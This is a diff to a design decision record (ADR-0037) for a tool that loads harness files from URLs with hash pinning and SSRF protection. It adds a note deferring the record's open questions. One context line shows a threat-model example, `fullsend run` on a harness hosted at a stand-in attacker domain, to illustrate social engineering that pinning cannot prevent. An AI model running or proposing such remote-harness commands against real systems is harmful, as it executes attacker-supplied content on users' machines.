@@ -1282,6 +1282,10 @@ harnesses:
 
 ## Open Questions
 
+**Note:** The questions below are intentionally deferred to future work and do not block acceptance of ADR-0037. The core design (URL support for declarative resources, mandatory hash pinning, SSRF protection, content-addressed caching) is production-ready. These questions address enhancements and governance models that can be resolved in subsequent ADRs as the ecosystem matures.
+
+Questions 1 (top-level harness trust), 2 (signature verification), and 3 (namespace governance) relate to **insider threat governance** and are explicitly called out in ADR-0037's Open Questions section as requiring community input and future ADR proposals. Question 4 (version resolution) is a convenience feature that can be added later without changing the core design. Question 5 (cache eviction) has a working recommendation (manual eviction) and can be refined based on operational experience.
+
 ### 1. Top-level harness URL protection
 
 When running `fullsend run https://attacker.com/evil.yaml#sha256=abc123`, the global domain allowlist in `config.yaml` (which includes `github.com` by default) is the only protection. Hash pinning prevents silent substitution, but not social engineering—a user can be tricked into pinning malicious content.
